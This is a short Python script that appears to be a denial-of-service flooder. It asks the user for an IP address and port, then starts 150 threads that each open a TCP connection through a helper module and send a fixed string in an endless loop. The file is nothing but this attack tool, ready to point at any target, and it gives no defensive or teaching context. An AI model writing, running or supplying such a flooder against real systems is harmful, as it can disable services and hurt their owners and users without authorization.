import socket, threading, requests, multiprocessing
import colorama
import TCP_Simple

def MutliThreadAttack(ip : str, port : int):
    def Attack():
        a = TCP_Simple.MultiSocketTcp()
        a.Connect(ip, port)
        while(1):
            a.SendByte("AAAAAAAAAA")
    for x in range(150):
        threading.Thread(target=Attack).start()


def ShowMenu():
    print("")
    ip = str(input("ip :"))
    port = int(input("port :"))
    MutliThreadAttack(ip,port)